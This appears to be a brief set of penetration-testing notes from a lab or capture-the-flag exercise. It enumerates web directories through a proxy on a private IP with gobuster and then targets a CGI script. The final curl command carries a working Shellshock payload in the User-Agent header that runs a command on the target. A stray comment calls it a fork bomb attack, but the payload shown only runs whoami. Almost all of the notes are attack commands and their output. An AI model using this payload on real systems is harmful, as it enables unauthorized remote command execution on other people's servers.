### shellshock
```bash
# cgi-bin - shellshock attack

gobuster dir -u http://192.168.1.10 --proxy http://192.168.1.10:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash

# ans
/index/               (Status: 200) [Size: 21]
/cgi-bin/             (Status: 403) [Size: 288]
/icons/               (Status: 403) [Size: 286]
/doc/                 (Status: 403) [Size: 284]

gobuster dir -u http://192.168.1.10/cgi-bin/ --proxy http://192.168.1.10:3128 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi

# ans
/status               (Status: 200) [Size: 197]

curl http://192.168.1.10/cgi-bin/status --proxy http://192.168.1.10:3128 | jq

# fork bomb atack

curl http://192.168.1.10/cgi-bin/status --proxy http://192.168.1.10:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"



```